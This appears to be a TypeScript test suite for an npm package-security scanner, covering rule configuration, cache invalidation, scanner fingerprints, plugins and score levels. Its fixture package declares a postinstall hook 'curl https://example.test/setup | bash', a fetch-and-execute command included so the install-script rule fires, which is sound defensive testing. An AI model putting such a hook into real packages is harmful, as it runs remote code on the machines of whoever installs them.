import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { CacheManager, DatabaseManager, NpmSafeEngine, SecurityLevel, Severity, FindingCategory, type NpmSafeEngineOptions } from '../src/index.js';
import type { PackageMetadata } from '../src/registry/types.js';
import { BUILTIN_RULES } from '../src/scanner/static-rules.js';
import { makeTarball } from './helpers/package-tarball.js';

describe('security guarantees across engine, rule configuration and SQLite', () => {
  let dir: string;
  let engine: NpmSafeEngine;
  let originalFetch: typeof fetch;
  let requests: number;
  let meta: PackageMetadata;
  const name = 'security-fixture-library';
  const open = (options: NpmSafeEngineOptions = {}) => new NpmSafeEngine({
    dbPath: path.join(dir, 'cache.db'),
    rulesConfigPath: path.join(dir, 'rules.json'),
    llmConfigPath: path.join(dir, 'llm.json'),
    rulesDir: path.join(dir, 'plugins'),
    ...options,
  });

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-correctness-'));
    originalFetch = globalThis.fetch;
    requests = 0;
    meta = {
      name, modified: '2026-01-01', 'dist-tags': { latest: '1.0.0' }, readme: '',
      versions: { '1.0.0': { name, version: '1.0.0', scripts: { postinstall: 'curl https://example.test/setup | bash' }, dist: { tarball: `https://registry.npmjs.org/${name}/fixture.tgz` } } },
    };
    globalThis.fetch = (async () => {
      requests++;
      return new Response(JSON.stringify(meta));
    }) as typeof fetch;
    engine = open();
  });
  afterEach(() => {
    engine?.close();
    globalThis.fetch = originalFetch;
    rmSync(dir, { recursive: true, force: true });
  });

  it('re-evaluates cached metadata after disabling and re-enabling a rule', async () => {
    const first = await engine.checkPackage(name);
    assert.equal(first.security.overallScore, 75);
    assert.equal(first.security.overallLevel, SecurityLevel.Dangerous);
    engine.setRuleEnabled('install-script', false);
    const disabled = await engine.checkPackage(name);
    assert.equal(disabled.security.overallScore, 100);
    assert.equal(disabled.security.staticScan?.findings.length, 0);
    engine.setRuleEnabled('install-script', true);
    const enabled = await engine.checkPackage(name);
    assert.equal(enabled.security.overallScore, 75);
    assert.equal(enabled.security.overallLevel, SecurityLevel.Dangerous);
    assert.equal(requests, 1, 'configuration invalidation preserves fresh metadata');
  });

  it('re-evaluates severity changes through the low-level config API and across restarts', async () => {
    engine.getRuleConfig().setSeverity('install-script', Severity.Low);
    assert.equal((await engine.checkPackage(name)).security.overallScore, 97);
    engine.getRuleConfig().setSeverity('install-script', Severity.Critical);
    const critical = await engine.checkPackage(name);
    assert.equal(critical.security.overallLevel, SecurityLevel.Dangerous);
    engine.close();
    engine = open();
    const restarted = await engine.checkPackage(name);
    assert.equal(restarted.security.overallLevel, SecurityLevel.Dangerous);
    assert.equal(restarted.security.overallScore, 75);
    assert.equal(requests, 1);
  });

  it('does not trust legacy reports without the current scanner fingerprint', async () => {
    await engine.checkPackage(name);
    const database = new DatabaseManager(path.join(dir, 'cache.db'));
    try {
      await new CacheManager(database).setSecurityReport({
        packageName: name, version: '1.0.0', overallLevel: SecurityLevel.Safe,
        score: 100, findings: [], scannedAt: new Date().toISOString(),
      });
    } finally { database.close(); }
    assert.equal((await engine.checkPackage(name)).security.overallLevel, SecurityLevel.Dangerous);
  });

  for (const legacyVersion of ['3', '4']) it(`rescans a v${legacyVersion} deep report after helper changes without refetching fresh metadata`, async () => {
    const source = `const asset = '${'A'.repeat(200)}';\nconst root = Function('return this')();`;
    const archive = makeTarball([{ path: 'package/index.js', content: source }]);
    const tarball = `https://registry.npmjs.org/${name}/fixture.tgz`;
    meta = {
      ...meta,
      versions: { '1.0.0': {
        name, version: '1.0.0',
        dist: { tarball, integrity: `sha512-${createHash('sha512').update(archive).digest('base64')}` },
      } },
    };
    const urls: string[] = [];
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      urls.push(url);
      assert.equal(url, tarball, 'fresh metadata must be reused without a registry request');
      return new Response(archive);
    }) as typeof fetch;

    // Reproduce the previous identity with otherwise identical rules/configuration:
    // the dynamic-execution helper changed outside the fingerprinted rule bodies.
    const legacyFingerprint = createHash('sha256').update(JSON.stringify({
      version: legacyVersion, revision: 0,
      rules: BUILTIN_RULES.map((rule) => ({ ...rule, match: rule.match.toString() })),
      config: [],
    })).digest('hex');
    const database = new DatabaseManager(path.join(dir, 'cache.db'));
    try {
      const cache = new CacheManager(database);
      await cache.setPackage(meta);
      await cache.setSecurityReport({
        packageName: name, version: '1.0.0', scannerFingerprint: legacyFingerprint,
        overallLevel: SecurityLevel.Safe, score: 85, scannedAt: new Date().toISOString(),
        findings: [{
          ruleId: 'content-obfuscated-exec', ruleName: 'Obfuscated dynamic code execution',
          severity: Severity.High, category: FindingCategory.CodeObfuscation,
          message: 'Legacy false positive: unrelated encoded asset and global-object probe.',
          filePath: 'package/index.js', lineNumber: 2,
        }],
        contentScan: {
          status: 'complete', archiveBytes: archive.length, unpackedBytes: Buffer.byteLength(source),
          filesScanned: 1, filesSkipped: 0, integrityVerified: true, truncated: false,
        },
      });

      // Preserve the cached deep boundary even when the caller omits --deep.
      const result = await engine.checkPackage(name);
      const report = result.security.staticScan;
      assert.equal(report?.contentScan?.status, 'complete');
      assert.equal(report?.contentScan?.integrityVerified, true);
      assert.equal(result.security.overallScore, 100);
      assert.ok(!report?.findings.some((finding) => finding.ruleId === 'content-obfuscated-exec'));
      assert.ok(report?.scannerFingerprint);
      assert.notEqual(report.scannerFingerprint, legacyFingerprint);
      const persisted = await cache.getSecurityReport(name, '1.0.0');
      assert.deepEqual(persisted?.findings, []);
      assert.equal(persisted?.scannerFingerprint, report.scannerFingerprint);

      await engine.checkPackage(name, { deep: true });
      assert.deepEqual(urls, [tarball], 'rescan once, then reuse the updated deep report');
    } finally { database.close(); }
  });

  it('invalidates reports on runtime registration, replacement and removal', async () => {
    engine.setRuleEnabled('install-script', false);
    await engine.checkPackage(name);
    const rule = (severity: Severity) => ({
      id: 'runtime', name: 'Runtime', description: '', enabled: true,
      severity, category: FindingCategory.KnownMalicious,
      match: () => [{ ruleId: 'runtime', ruleName: 'Runtime', severity, category: FindingCategory.KnownMalicious, message: 'fixture' }],
    });
    engine.registerRule(rule(Severity.Low));
    assert.equal((await engine.checkPackage(name)).security.overallScore, 97);
    engine.registerRule(rule(Severity.Critical));
    assert.equal((await engine.checkPackage(name)).security.overallLevel, SecurityLevel.Dangerous);
    engine.unregisterRule('runtime');
    assert.equal((await engine.checkPackage(name)).security.overallScore, 100);
  });

  it('loads configured plugins before the first check can populate the cache', async () => {
    engine.close();
    mkdirSync(path.join(dir, 'plugins'));
    writeFileSync(path.join(dir, 'plugins', 'fixture.mjs'), `export const rule = {
      id: 'fixture', name: 'Fixture', description: '', severity: 'critical', category: 'known-malicious', enabled: true,
      match() { return [{ ruleId: 'fixture', ruleName: 'Fixture', severity: 'critical', category: 'known-malicious', message: 'fixture' }]; }
    };`);
    engine = open();
    assert.ok((await engine.checkPackage(name)).security.staticScan?.findings.some((finding) => finding.ruleId === 'fixture'));
  });

  it('keeps three and four critical findings dangerous on live and cached paths', async () => {
    for (const count of [3, 4]) {
      engine.registerRule({
        id: 'counted', name: 'Counted', description: '', enabled: true,
        severity: Severity.Critical, category: FindingCategory.KnownMalicious,
        match: () => Array.from({ length: count }, () => ({ ruleId: 'counted', ruleName: 'Counted', severity: Severity.Critical, category: FindingCategory.KnownMalicious, message: 'fixture' })),
      });
      engine.setRuleEnabled('install-script', false);
      for (let round = 0; round < 2; round++) {
        const checked = await engine.checkPackage(name);
        assert.equal(checked.security.overallScore, Math.max(0, 100 - 25 * count));
        assert.equal(checked.security.overallLevel, SecurityLevel.Dangerous);
      }
    }
  });

  it('keeps High evidence suspicious at 85 on live and persisted cache paths', async () => {
    engine.setRuleEnabled('install-script', false);
    engine.registerRule({
      id: 'high-fixture', name: 'High fixture', description: '', enabled: true,
      severity: Severity.High, category: FindingCategory.SensitiveExposure,
      match: () => [{ ruleId: 'high-fixture', ruleName: 'High fixture', severity: Severity.High,
        category: FindingCategory.SensitiveExposure, message: 'Policy fixture' }],
    });
    for (let round = 0; round < 2; round++) {
      const result = await engine.checkPackage(name);
      assert.equal(result.security.overallScore, 85);
      assert.equal(result.security.overallLevel, SecurityLevel.Suspicious);
    }
    const database = new DatabaseManager(path.join(dir, 'cache.db'));
    try {
      const persisted = await new CacheManager(database).getSecurityReport(name, '1.0.0');
      assert.equal(persisted?.overallLevel, SecurityLevel.Suspicious);
      assert.equal(persisted?.score, 85);
    } finally { database.close(); }
  });

  it('forceRefresh fetches current metadata and a pre-aborted check does no work', async () => {
    await engine.checkPackage(name);
    await engine.checkPackage(name, { forceRefresh: true });
    assert.equal(requests, 2);
    await assert.rejects(engine.checkPackage(name, { signal: AbortSignal.abort() }), { name: 'AbortError' });
    assert.equal(requests, 2);
  });

  it('a benign LLM response cannot dilute static critical evidence on live or cached checks', async () => {
    engine.close();
    engine = open({ llm: { apiKey: 'fixture-key', baseUrl: 'https://llm.example.test/v1' } });
    globalThis.fetch = (async (url: RequestInfo | URL) => new Response(JSON.stringify(
      String(url).startsWith('https://llm.example.test/')
        ? { choices: [{ message: { content: JSON.stringify({ suspiciousScore: 0, findings: [], summary: 'benign fixture' }) } }] }
        : meta,
    ))) as typeof fetch;
    for (let round = 0; round < 2; round++) {
      const result = await engine.checkPackage(name);
      assert.equal(result.security.llmScan?.enabled, true);
      assert.equal(result.security.overallScore, 75);
      assert.equal(result.security.overallLevel, SecurityLevel.Dangerous);
    }
  });
});
